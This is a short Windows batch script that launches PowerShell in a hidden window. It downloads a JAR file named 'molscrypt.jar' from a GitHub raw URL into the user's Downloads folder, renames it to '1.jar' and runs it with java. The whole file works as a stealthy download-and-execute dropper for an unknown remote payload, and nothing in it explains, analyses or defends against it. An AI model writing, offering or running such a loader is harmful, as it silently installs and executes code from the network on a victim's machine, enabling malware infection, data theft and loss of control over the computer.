@echo off
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/molsss/sss/raw/main/molscrypt.jar' -OutFile '$env:USERPROFILE\Downloads\molscrypt.jar'; Rename-Item -Path '$env:USERPROFILE\Downloads\molscrypt.jar' -NewName '1.jar'; Start-Process -FilePath 'java' -ArgumentList '-jar $env:USERPROFILE\Downloads\1.jar'"
